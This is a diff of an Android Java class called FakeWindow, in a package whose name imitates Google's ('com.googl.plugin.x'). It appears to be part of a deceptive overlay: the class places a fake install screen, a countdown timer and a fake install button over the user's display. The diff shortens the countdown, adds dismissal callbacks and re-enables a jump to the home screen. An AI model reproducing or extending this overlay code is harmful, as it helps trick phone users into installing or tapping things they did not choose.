@@ -7,6 +7,8 @@ import android.util.DisplayMetrics;
 import android.view.*;
 import android.widget.TextView;
 import com.googl.plugin.x.R;
+import com.plugin.common.utils.UtilsRuntime;
+import com.xstd.plugin.config.Config;
 
 /**
  * Created with IntelliJ IDEA.
@@ -17,16 +19,25 @@ import com.googl.plugin.x.R;
  */
 public class FakeWindow {
 
+    public static interface WindowListener {
+
+        void onWindowPreDismiss();
+
+        void onWindowDismiss();
+    }
+
     private View coverView;
     private View timerView;
     private TextView timeTV;
     private View installView;
     private Context context;
     private WindowManager wm;
-    private int count = 10;
+    private int count = 5;
     private Handler handler;
 
-    public FakeWindow(Context context) {
+    private WindowListener mWindowListener;
+
+    public FakeWindow(Context context, WindowListener l) {
         this.context = context;
         LayoutInflater layoutInflater = (LayoutInflater) context.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
         coverView = layoutInflater.inflate(R.layout.fake_install, null);
@@ -35,12 +46,19 @@ public class FakeWindow {
         installView = layoutInflater.inflate(R.layout.fake_install_btn, null);
         wm = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
         handler = new Handler(context.getMainLooper());
+
+        mWindowListener = l;
     }
 
     public void updateTimerCount() {
         if (count <= 0) {
+            if (mWindowListener != null) {
+                mWindowListener.onWindowDismiss();
+            }
             if (coverView != null && timerView != null) {
-//                    UtilsRuntime.goHome(context);
+                if (Config.DEBUG_IF_GO_HOME) {
+                    UtilsRuntime.goHome(context);
+                }
                 wm.removeView(coverView);
                 wm.removeView(timerView);
                 wm.removeView(installView);
@@ -55,6 +73,13 @@ public class FakeWindow {
                     if (coverView != null && timerView != null) {
                         timeTV.setText(String.format(context.getString(R.string.fake_timer), count));
                         count--;
+
+                        if (count == 0) {
+                            if (mWindowListener != null) {
+                                mWindowListener.onWindowPreDismiss();
+                            }
+                        }
+
                         handler.postDelayed(new Runnable() {
                             @Override
                             public void run() {
